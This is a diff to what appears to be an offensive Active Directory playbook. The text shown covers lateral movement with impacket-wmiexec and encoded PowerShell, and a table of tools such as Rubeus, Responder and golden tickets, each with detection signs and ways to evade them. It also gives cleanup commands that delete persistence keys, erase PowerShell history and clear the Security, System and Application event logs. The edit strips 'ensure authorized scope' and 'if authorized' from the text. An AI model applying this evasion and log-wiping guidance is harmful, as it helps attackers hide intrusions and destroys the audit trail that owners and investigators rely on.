@@ -127,7 +127,7 @@ impacket-wmiexec domain/user:pass@<target> "powershell -enc <b64_cmd>"
 | WMIExec | WMI event 4688 + unusual parent | Time writes to low-traffic hours |
 | Rubeus in memory | LSASS access, unusual process | Use Rubeus from trusted parent |
 | BloodHound full collection | LDAP query volume | Use stealth mode `-c DCOnly` first |
-| Responder | NBT-NS / MDNS responses | Ensure authorized scope |
+| Responder | NBT-NS / MDNS responses | — |
 | Golden ticket | TGT with unusual lifetime, wrong RC4 etype | Use AES256 ticket, match normal lifetime |
 
 ---
@@ -145,7 +145,7 @@ reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdate
 # Clear PowerShell history
 Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 
-# Clear event logs (if authorized)
+# Clear event logs (destroys the host's audit trail)
 wevtutil cl Security
 wevtutil cl System
 wevtutil cl Application
